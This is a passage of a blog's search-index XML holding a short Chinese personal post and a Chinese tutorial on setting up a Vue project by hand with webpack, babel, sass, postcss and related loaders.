      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>情人节</title>
    <url>/2018/02/14/%E6%83%85%E4%BA%BA%E8%8A%82/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;今天是<code>2018年2月14日</code>，也是情人节而且明天就过年了。感觉自己需要更努力了，加油学习技术，希望每天都能进步一点。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;最近看的Javascript Dom 编程艺术一定要仔细看，学习一些优化和预防错误的代码，HTML权威指南也要大概知道那些东西，不一定要全部记住但看到的时候至少要认识。</p>
<p>&nbsp;&nbsp;&nbsp;最近学习比较大的任务是学vue2.0和yii2.0。至少学完之后自己能做一个小demo出来。</p>
<p>&nbsp;&nbsp;&nbsp;加油！加油！加油！顺便表白哥哥。</p>
<p><img src="/images/gege1.jpg" alt=""></p>
]]></content>
      <categories>
        <category>生活分享</category>
      </categories>
      <tags>
        <tag>-生活 -心情</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建vue-cli</title>
    <url>/2019/05/14/%E6%90%AD%E5%BB%BAvue-cli/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近看到网上的一篇博客，写的如何自己搭建一个vue-cli。自己思考了一下，好像之前面试也被问到过这个问题，但是要自己一下子来回答还是有点不确定。所以自己就决定，也像那篇博客一样，一步一步的搭一下。我们都知道vue-cli生成的项目中可以配置各种各样的功能。比如转码、文件转换、资源加上hash、代码热更新、资源预加载等。那具体是怎么实现的呢？<br><a id="more"></a></p>
<h2 id="1-搭建webpack环境"><a href="#1-搭建webpack环境" class="headerlink" title="1 搭建webpack环境"></a>1 搭建webpack环境</h2><h3 id="1-1-初始化"><a href="#1-1-初始化" class="headerlink" title="1.1 初始化"></a>1.1 初始化</h3><p>新建一个文件夹，在文件夹中输入下面的命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm init //生成package.json</span><br><span class="line"></span><br><span class="line">cnpm install webpack webpack-cli -D //安装webpack</span><br></pre></td></tr></table></figure></p>
<h3 id="1-2-测试"><a href="#1-2-测试" class="headerlink" title="1.2 测试"></a>1.2 测试</h3><p>在文件夹中新建一个src文件夹，再在里面建立一个main.js<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure></p>
<p>可以再package.json中新增一条命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;serve&quot;: &quot;webpack ./src/main.js --mode development&quot;</span><br></pre></td></tr></table></figure></p>
<p>测试的目录结构如图所示：<br><img src="/images/cli1.png" alt="My Pic"><br>运行结果：打包成功 生成了一个dist文件夹</p>
<h2 id="2-配置功能"><a href="#2-配置功能" class="headerlink" title="2.配置功能"></a>2.配置功能</h2><ul>
<li>在根目录新建一个build文件夹，来存放webpack的配置信息</li>
<li>在build文件夹中建立一个webpack.config.js,基本配置文件</li>
<li>像里面添加内容<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">mode: <span class="string">'development'</span>,<span class="comment">//指定打包的模式</span></span><br><span class="line">entry: &#123;<span class="comment">//打包的入口</span></span><br><span class="line">main: path.resolve(__dirname,<span class="string">'../src/main.js'</span>)<span class="comment">//将文件路径解析为绝对路径</span></span><br><span class="line">&#125;,</span><br><span class="line">output: &#123;</span><br><span class="line">path: path.resolve(__dirname, <span class="string">'../dist'</span>),</span><br><span class="line">filename: <span class="string">'js/[name].[hash:8].js'</span>,<span class="comment">//生成文件路径及名字</span></span><br><span class="line">publicPath: <span class="string">'./'</span><span class="comment">//资源引用路径</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>再修改package.json中命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&quot;serve&quot;: &quot;webpack ./src/main.js --config ./build/webpack.config.js&quot;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-1配置ES6-7-8转ES5"><a href="#2-1配置ES6-7-8转ES5" class="headerlink" title="2.1配置ES6/7/8转ES5"></a>2.1配置ES6/7/8转ES5</h3><ul>
<li>安装做需要的依赖<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install babel-loader @babel/core @babel/preset-env</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>*修改webpack.config.js配置<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'development'</span>,<span class="comment">//指定打包的模式</span></span><br><span class="line">  entry: &#123;<span class="comment">//打包的入口</span></span><br><span class="line">    main: path.resolve(__dirname,<span class="string">'../src/main.js'</span>)<span class="comment">//将文件路径解析为绝对路径</span></span><br><span class="line">  &#125;,</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.resolve(__dirname, <span class="string">'../dist'</span>),</span><br><span class="line">    filename: <span class="string">'js/[name].[hash:8].js'</span>,<span class="comment">//生成文件路径及名字</span></span><br><span class="line">    publicPath: <span class="string">'./'</span><span class="comment">//资源引用路径</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.jsx?$/</span>,</span><br><span class="line">        exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'babel-loader'</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">     ]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>在根目录中提那家一个babel.config.js<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    presets: [</span><br><span class="line">        <span class="string">"@babel/preset-env"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这样就实现了转码的功能</p>
<h4 id="2-1-1-ES6-7-8-API转es5"><a href="#2-1-1-ES6-7-8-API转es5" class="headerlink" title="2.1.1 ES6/7/8 API转es5"></a>2.1.1 ES6/7/8 API转es5</h4><p>由于babe-loader只会将ES6/7/8语法转换为ES5，但是对api并没有转化<br>所以还需要安装新的依赖<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install @babel/polyfill</span><br></pre></td></tr></table></figure></p>
<p>同时修改webpack.config.js<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">entry: &#123;<span class="comment">//打包的入口</span></span><br><span class="line">main: [<span class="string">"@babel/polyfill"</span>,path.resolve(__dirname,<span class="string">'../src/main.js'</span>)]<span class="comment">//将文件路径解析为绝对路径</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<h4 id="2-1-2按需引入polyfill"><a href="#2-1-2按需引入polyfill" class="headerlink" title="2.1.2按需引入polyfill"></a>2.1.2按需引入polyfill</h4><p>与上一个配置其一便可</p>
<ul>
<li>安装相关依赖<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install core-js@2 @babel/runtime-corejs2 -S</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>修改babel-config.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  presets: [</span><br><span class="line">    [<span class="string">"@babel/preset-env"</span>,&#123;</span><br><span class="line">       <span class="string">"useBuiltIns"</span>:<span class="string">"usage"</span></span><br><span class="line">     &#125;]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>设置按需引入后能大大减少打包编译后的体积</p>
<h3 id="2-2-配置scss转css"><a href="#2-2-配置scss转css" class="headerlink" title="2.2 配置scss转css"></a>2.2 配置scss转css</h3><p>如果没配置css相关的loader时，引入sass、less等相关文件打包时会报错</p>
<ul>
<li>安装相关依赖<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install sass-loader dart-sass css-loader style-loader -D</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>sass-loader, dart-sass主要是将 scss/sass 语法转为csscss-loader主要是解析 css 文件style-loader 主要是将 css 解析到 html页面 的 style 上</p>
<ul>
<li>修改webpack.config.js配置<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>: &#123;</span><br><span class="line">  rules: [</span><br><span class="line">    &#123;</span><br><span class="line">      test: <span class="regexp">/\.jsx?$/</span>,</span><br><span class="line">      exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">      use: [</span><br><span class="line">        &#123;</span><br><span class="line">          loader: <span class="string">'babel-loader'</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      test:<span class="regexp">/\.(sass|scss)$/</span>,</span><br><span class="line">      use: [</span><br><span class="line">        &#123;</span><br><span class="line">          loader: <span class="string">'style-loader'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          loader: <span class="string">'css-loader'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          loader: <span class="string">'sass-loader'</span>,</span><br><span class="line">          options: &#123;</span><br><span class="line">            implementation: <span class="built_in">require</span>(<span class="string">'dart-sass'</span>)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-3配置postcss自动添加css3前缀"><a href="#2-3配置postcss自动添加css3前缀" class="headerlink" title="2.3配置postcss自动添加css3前缀"></a>2.3配置postcss自动添加css3前缀</h3><ul>
<li><p>安装相关依赖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install postcss-loader autoprefixer -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改webpack.config.js配置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test:<span class="regexp">/\.(sass|scss)$/</span>,</span><br><span class="line">  use: [</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'style-loader'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'css-loader'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'sass-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        implementation: <span class="built_in">require</span>(<span class="string">'dart-sass'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'postcss-loader'</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在根目录新建一个postcss.config.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    plugins: &#123;</span><br><span class="line">      autoprefixer: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-4-使用html-webpack-plugin来创建html模板"><a href="#2-4-使用html-webpack-plugin来创建html模板" class="headerlink" title="2.4 使用html-webpack-plugin来创建html模板"></a>2.4 使用html-webpack-plugin来创建html模板</h3><p>使用html-webpack-plugin来创建html页面，并自动引入打包生成的js文件</p>
<ul>
<li><p>安装依赖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install html-webpack-plugin -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>新建一个public文件夹，并在里面新建index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>index<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改webpack.config.js配置<br><img src="/images/cli2.png" alt="My Pic"></p>
<h3 id="2-5-配置devServer热更新功能"><a href="#2-5-配置devServer热更新功能" class="headerlink" title="2.5 配置devServer热更新功能"></a>2.5 配置devServer热更新功能</h3><p>热更新功能可以实现不刷新页面的情况下，更新页面</p>
</li>
<li><p>安装依赖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install webpack-dev-server -D</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改webpack.config.js配置</p>
</li>
<li>通过配置devServer和HotModuleReplacementPlugin插件来实现<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">devServer:&#123;</span><br><span class="line">hot: <span class="literal">true</span>,</span><br><span class="line">port: <span class="number">3000</span>,</span><br><span class="line">contentBase: <span class="string">'./dist'</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-6-配置webpack打包图片、媒体、字体等"><a href="#2-6-配置webpack打包图片、媒体、字体等" class="headerlink" title="2.6 配置webpack打包图片、媒体、字体等"></a>2.6 配置webpack打包图片、媒体、字体等</h3><ul>
<li>安装依赖<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install file-loader url-loader -D</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>file-loader 解析文件url，并将文件复制到输出的目录中url-loader 功能与 file-loader 类似，如果文件小于限制的大小。则会返回 base64 编码，否则使用 file-loader 将文件复制到输出的目录中</p>
<ul>
<li>修改webpack-config.js配置在rules中添加相应的规则<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.(jpe?g|png|gif)$/i</span>,</span><br><span class="line">  use: [</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'url-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">         limit: <span class="number">4096</span>,</span><br><span class="line">         fallback: &#123;</span><br><span class="line">           loader: <span class="string">'file-loader'</span>,</span><br><span class="line">             options: &#123;</span><br><span class="line">                 name: <span class="string">'img/[name].[hash:8].[ext]'</span></span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    test: <span class="regexp">/\.(mp4|webm|ogg|mp3|wav|flac|aac)(\?.*)?$/</span>,</span><br><span class="line">    use: [</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'url-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">         limit: <span class="number">4096</span>,</span><br><span class="line">         fallback: &#123;</span><br><span class="line">           loader: <span class="string">'file-loader'</span>,</span><br><span class="line">             options: &#123;</span><br><span class="line">               name: <span class="string">'media/[name].[hash:8].[ext]'</span></span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    test: <span class="regexp">/\.(woff2?|eot|ttf|otf)(\?.*)?$/i</span>,</span><br><span class="line">    use: [</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'url-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        limit: <span class="number">4096</span>,</span><br><span class="line">        fallback: &#123;</span><br><span class="line">        loader: <span class="string">'file-loader'</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">           name: <span class="string">'fonts/[name].[hash:8].[ext]'</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="3-让webpack识别-vue文件"><a href="#3-让webpack识别-vue文件" class="headerlink" title="3 让webpack识别.vue文件"></a>3 让webpack识别.vue文件</h2><ul>
<li>安装所需的依赖<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm </span><br><span class="line">npm install vue-loader vue-template-compiler cache-loader thread-loader -D</span><br><span class="line">cnpm install vue -S</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>vue-loader 用于解析.vue文件vue-template-compiler 用于编译模板cache-loader 用于缓存loader编译的结果thread-loader 使用 worker 池来运行loader，每个 worker 都是一个 node.js 进程。</p>
<ul>
<li><p>修改webpack.config.js配置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>) </span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>) </span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>) </span><br><span class="line"><span class="keyword">const</span> VueLoaderPlugin = <span class="built_in">require</span>(<span class="string">'vue-loader/lib/plugin'</span>) <span class="built_in">module</span>.exports = &#123; </span><br><span class="line">  mode: <span class="string">'development'</span>, </span><br><span class="line">  entry: &#123; <span class="comment">// ... &#125;, </span></span><br><span class="line">  output: &#123; <span class="comment">// ... &#125;,</span></span><br><span class="line">  devServer: &#123; <span class="comment">// ... &#125;,</span></span><br><span class="line">  resolve: &#123; </span><br><span class="line">    alias: &#123;</span><br><span class="line">      vue$: <span class="string">'vue/dist/vue.runtime.esm.js'</span></span><br><span class="line">    &#125;, </span><br><span class="line">   &#125;, </span><br><span class="line">   <span class="built_in">module</span>: &#123;</span><br><span class="line">     rules: [</span><br><span class="line">       &#123; </span><br><span class="line">         test: <span class="regexp">/\.vue$/</span>, </span><br><span class="line">         use: [</span><br><span class="line">           &#123; </span><br><span class="line">             loader: <span class="string">'cache-loader'</span> </span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             loader: <span class="string">'thread-loader'</span> </span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             loader: <span class="string">'vue-loader'</span>, </span><br><span class="line">             options: &#123;</span><br><span class="line">               compilerOptions: &#123; </span><br><span class="line">                 preserveWhitespace: <span class="literal">false</span></span><br><span class="line">                &#125;, </span><br><span class="line">              &#125; </span><br><span class="line">            &#125;</span><br><span class="line">          ] </span><br><span class="line">        &#125;,</span><br><span class="line">        &#123; </span><br><span class="line">          test: <span class="regexp">/\.jsx?$/</span>,</span><br><span class="line">          use: [ </span><br><span class="line">            &#123; </span><br><span class="line">              loader: <span class="string">'cache-loader'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123; </span><br><span class="line">              loader: <span class="string">'thread-loader'</span> </span><br><span class="line">            &#125;,</span><br><span class="line">            &#123; </span><br><span class="line">              loader: <span class="string">'babel-loader'</span></span><br><span class="line">            &#125; </span><br><span class="line">          ]</span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="comment">// ... </span></span><br><span class="line">         ]</span><br><span class="line">       &#125;,</span><br><span class="line">       plugins: [ <span class="comment">// ... new VueLoaderPlugin() ] </span></span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试一下结果<br>1.在src下新建App，vue</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">    Hello World</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &apos;app&apos;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style lang=&quot;scss&quot; scoped&gt;</span><br><span class="line">.app &#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>2.修改main.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App.vue'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;).$mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure></p>
<p>3.运行一下 npm run serve<br>能够正常打包</p>
<h2 id="4-定义环境变量"><a href="#4-定义环境变量" class="headerlink" title="4 定义环境变量"></a>4 定义环境变量</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">        <span class="string">'process.env'</span>: &#123;</span><br><span class="line">            VUE_APP_BASE_URL: <span class="built_in">JSON</span>.stringfy(<span class="string">'http://localhost:3000'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="5-区分生产环境和开发环境"><a href="#5-区分生产环境和开发环境" class="headerlink" title="5.区分生产环境和开发环境"></a>5.区分生产环境和开发环境</h2><p>新建两个文件</p>
<ul>
<li>webpack.config.js 公用的配置</li>
<li>webpack.dev.js  开发环境使用</li>
<li>webpack.prod.js 生产环境<br>比较一下开发环境与生产环境的不停<h3 id="5-1开发环境"><a href="#5-1开发环境" class="headerlink" title="5.1开发环境"></a>5.1开发环境</h3></li>
</ul>
<ol>
<li>不需要代码压缩</li>
<li>需要热更新</li>
<li>css不需要提取到css文件</li>
<li>sourseMap</li>
<li>不需要转码</li>
</ol>
<h3 id="5-2生产环境"><a href="#5-2生产环境" class="headerlink" title="5.2生产环境"></a>5.2生产环境</h3><ol>
<li>压缩代码</li>
<li>不需要热更新</li>
<li>提取css并压缩</li>
<li>sourceMap</li>
<li>构建时覆盖之前的内容</li>
</ol>
<ul>
<li>安装所需的依赖<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i @intervolga/optimize-cssnano-plugin mini-css-extract-plugin clean-webpack-plugin webpack-merge copy-webpack-plugin -D</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol>
<li>@intervolga/optimize-cssnano-plugin 用于压缩css代码</li>
<li>mini-css-extract-plugin 用于提取css到文件中</li>
<li>clean-webpack-plugin 用于删除上次构建的文件</li>
<li>webpack-merge 合并 webpack配置</li>
<li>copy-webpack-plugin 用户拷贝静态资源</li>
</ol>
<h3 id="5-3开发环境配置"><a href="#5-3开发环境配置" class="headerlink" title="5.3开发环境配置"></a>5.3开发环境配置</h3><ul>
<li><p>build/webpack.dev.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// build/webpack.dev.js</span></span><br><span class="line"><span class="keyword">const</span> merge = <span class="built_in">require</span>(<span class="string">'webpack-merge'</span>)</span><br><span class="line"><span class="keyword">const</span> webpackConfig = <span class="built_in">require</span>(<span class="string">'./webpack.config'</span>)</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = merge(webpackConfig, &#123;</span><br><span class="line">  mode: <span class="string">'development'</span>,</span><br><span class="line">  devtool: <span class="string">'cheap-module-eval-source-map'</span>,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.(scss|sass)$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'style-loader'</span></span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'css-loader'</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              importLoaders: <span class="number">2</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'sass-loader'</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              implementation: <span class="built_in">require</span>(<span class="string">'dart-sass'</span>)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'postcss-loader'</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">      <span class="string">'process.env'</span>: &#123;</span><br><span class="line">        NODE_ENV: <span class="built_in">JSON</span>.stringify(<span class="string">'development'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>build/webpack.config.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// build/webpack.config.js</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> VueLoaderPlugin = <span class="built_in">require</span>(<span class="string">'vue-loader/lib/plugin'</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: &#123;</span><br><span class="line">    <span class="comment">// 配置入口文件</span></span><br><span class="line">    main: path.resolve(__dirname, <span class="string">'../src/main.js'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  output: &#123;</span><br><span class="line">    <span class="comment">// 配置打包文件输出的目录</span></span><br><span class="line">    path: path.resolve(__dirname, <span class="string">'../dist'</span>),</span><br><span class="line">    <span class="comment">// 生成的 js 文件名称</span></span><br><span class="line">    filename: <span class="string">'js/[name].[hash:8].js'</span>,</span><br><span class="line">    <span class="comment">// 生成的 chunk 名称</span></span><br><span class="line">    chunkFilename: <span class="string">'js/[name].[hash:8].js'</span>,</span><br><span class="line">    <span class="comment">// 资源引用的路径</span></span><br><span class="line">    publicPath: <span class="string">'/'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    hot: <span class="literal">true</span>,</span><br><span class="line">    port: <span class="number">3000</span>,</span><br><span class="line">    contentBase: <span class="string">'./dist'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      vue$: <span class="string">'vue/dist/vue.runtime.esm.js'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    extensions: [</span><br><span class="line">      <span class="string">'.js'</span>,</span><br><span class="line">      <span class="string">'.vue'</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.vue$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'cache-loader'</span></span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'vue-loader'</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              compilerOptions: &#123;</span><br><span class="line">                preserveWhitespace: <span class="literal">false</span></span><br><span class="line">              &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.jsx?$/</span>,</span><br><span class="line">        loader: <span class="string">'babel-loader'</span></span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      